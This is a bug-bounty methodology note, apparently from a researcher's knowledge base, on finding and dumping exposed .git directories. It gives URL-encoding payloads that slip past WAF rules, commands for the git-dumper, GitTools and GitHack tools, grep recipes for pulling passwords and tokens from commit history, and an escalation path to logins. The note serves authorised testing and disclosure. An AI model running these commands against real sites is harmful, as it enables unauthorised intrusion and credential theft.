---
type: pattern
title: Pattern - .git Directory Exposure
tags: [pattern, cwe-538, git-exposure, waf-bypass, url-encoding-bypass, methodology, high-roi, bb-pattern]
status: verified
last_updated: 2026-04-29
---

# Pattern - .git Directory Exposure

> The highest-ROI dork in the book. A single exposed `.git` directory can unravel an entire attack chain.
> **Update**: even behind a WAF, URL encoding can sometimes bypass the block.

## Success Cases (anonymized)

| Target | Tool | Discovery | Result |
|--------|------|-----------|--------|
| Target A | git-dumper | SQL dump + credentials + an XSS chain | Submitted, rated Critical |
| Target B (×7 related hosts) | git-dumper | MySQL credentials with ALL PRIVILEGES on 28 databases | Submitted, rated Critical |
| Target C | git-dumper | Mailgun API key + SMTP credentials + a password-history diff | Submitted, rated High |
| Target D | git-dumper | SMTP credentials | Submitted, rated High |
| Target E | GitHack | `.env` + a SQL dump containing PII | Submitted, rated Critical |
| Target F | GitTools | Backdoor authentication-bypass code | Ready to submit |
| Target G | git-dumper | External MySQL credentials | Ready to submit |
| Target H | curl with URL encoding | WAF blocked the literal path, but `%2e%67%69%74` bypassed it → revealed an internal GitLab URL + hostnames + a root-owned deployment | Submitted, rated High |

## Step 0: Bypass WAF Protection Before Reaching for Tools

When `/.git/HEAD` returns **403** or **404**, **don't give up immediately**.
Try a URL-encoding bypass first — Apache/Nginx WAF rules typically only match the literal string `.git`:

```bash
# standard check (if 403 → continue with the following)
curl -I "https://target/.git/HEAD"

# URL-encoding bypass: .git → %2e%67%69%74
curl -s "https://target/%2e%67%69%74/HEAD"
# a response of "ref: refs/heads/main" means the WAF bypass worked

# other common variants
curl -s "https://target/%2E%67%69%74/HEAD"          # uppercase %2E
curl -s "https://target/.%67%69%74/HEAD"             # only encode "git"
curl -s "https://target/%2egit/HEAD"                 # only encode the dot
curl -s "https://target/%252e%252e/.git/HEAD"        # double encoding (rare)
```

> [!tip] Why this works
> WAF rules usually match the literal ASCII string `.git`.
> URL decoding happens at the web-server layer, AFTER the WAF layer,
> so `%2e%67%69%74` doesn't look like `.git` to the WAF,
> but Apache/Nginx decode it to the same path.

**Real-world case (Target H)**:
- `/.git/HEAD` → 403 (WAF/htaccess blocked)
- `/%2e%67%69%74/HEAD` → **200**, `ref: refs/heads/prod_20251027`
- Extracted: an internal GitLab hostname, internal server hostnames, and evidence of a root-owned deployment

## Three-Tool Pipeline (run all of them)

```bash
# 1. git-dumper (first choice, reconstructs commit history)
pip3 install git-dumper
python3 -m git_dumper "https://target/.git/" ./output/

# WAF-bypass variant (if the literal .git path is blocked)
python3 -m git_dumper "https://target/%2e%67%69%74/" ./output/

# 2. GitTools Extractor (rebuilds multiple commit-tree versions)
bash GitTools/Extractor/extractor.sh ./output/ ./extracted/

# 3. GitHack (fallback, reliable)
python3 GitHack.py https://target/.git/
```

> [!warning] Why run all three?
> No single tool always wins — one tool has extracted a password diff that another tool missed entirely, and vice versa for individual files. Results are complementary, not redundant.

## Mandatory Post-Recovery Checklist

```bash
# 1. credential changes in commit history
git log --all --oneline
git log --all -p | grep -iE "password|secret|key|token|passwd"

# 2. remote URL (may be a private GitLab/GitHub instance)
cat .git/config

# 3. deployment server info
cat .git/logs/HEAD | head -20

# 4. deleted sensitive files
git log --all --diff-filter=D -- "*.env" "*.sql" "*.pem" "config/*"

# 5. credential diffs between versions
git diff HEAD~10 HEAD -- config/ | grep -iE "pass|key"

# 6. .env and config files
find . -name ".env*" -o -name "config.php" -o -name "database.yml" -o -name "wp-config.php"
```

## Impact Escalation Path

```
.git exposure
  → credentials / API keys → direct login (PoC: curl confirms 200)
  → database connection string → describe the SQL-dump risk (don't actually connect)
  → source code → hunt for other vulnerabilities (XSS, SQLi, backdoors) → chain the attack
  → git remote URL → identify the development vendor → supply-chain analysis
  → commit history → developer emails → OSINT
```

## Suitable Platforms

| Platform | Fit | Notes |
|----------|-----|-------|
| National/regional CERT coordinated disclosure | Best fit | high acceptance for local-vendor source leaks |
| Firmware/vendor CERT programs | Good fit | firmware vendor source-code leaks |
| H1 / Bugcrowd | Depends on scope | confirm `.git` is explicitly in scope |

## PoC Format (curl, directly copyable)

```bash
# confirm .git/HEAD is readable
curl -s https://target.com/.git/HEAD
# expected output: ref: refs/heads/main

# confirm PACK files are downloadable
curl -I https://target.com/.git/objects/pack/pack-<hash>.pack
# expected: HTTP/1.1 200 OK
```

## Related

- [[Lessons Learned]] — .git exposure is the highest-ROI dork
- [[Checklist - Disclosed Findings Pre-Read Gate]]
